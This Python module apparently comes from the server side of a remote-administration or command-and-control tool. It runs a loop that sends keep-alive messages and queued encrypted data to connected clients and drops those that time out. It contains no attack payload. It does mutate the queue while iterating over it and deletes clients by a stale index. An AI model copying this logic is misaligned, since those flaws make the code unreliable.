import time

from domestic.parse.internal_server_error_exception_handling import *
from domestic.utility.status_message import *
from binary.data_handling.send_data import *
from binary.data_handling.recv_data import *
from domestic.utility.delete_client import *
from domestic.session.exit_session import *
from domestic.utility.write_error import *
from domestic.global_state import *


@internal_server_error_exception_handling
def session_queue():
	while True:
		for index in range(len(state['sockets']['clients'][0])):
			if time.time() - state['sockets']['clients'][2][index]['timer'] >= state['settings']['keep-alive-count']:
				state['settings']['dynamic']['queue'].append((state['sockets']['clients'][0][index], {'message': 'bbCF2NNYjjTfHELUV9Y2qmkV'}, False))
				state['sockets']['clients'][2][index]['timer'] = time.time()

		if state['settings']['dynamic']['queue']:
			for item in state['settings']['dynamic']['queue']:
				try:
					send_data(item[0], item[1], (state['settings']['encryption'], state['settings']['encoding'], state['settings']['headersize']), {'safe': state['options']['mode']['safe'], 'safe_timeout': state['settings']['safe-timeout']})
					data = recv_data(item[0], (state['settings']['encryption'], state['settings']['headersize']))

					if item[2]:
						state['session']['data'] = data
				except Exception as err:
					write_error(err)

					if item[2]:
						exit_session(False, {'message': 'Timeout reached waiting for client response\nClient had to be disconnected', 'text_mode': 'danger'})
					elif state['session']['socket'] is item[0]:
						exit_session(False)
						print()
						status_message('Timeout reached waiting for client response\nClient had to be disconnected', 'danger')

					delete_client(index, False)
				finally:
					state['settings']['dynamic']['queue'].remove(item)
		else:
			time.sleep(0.1)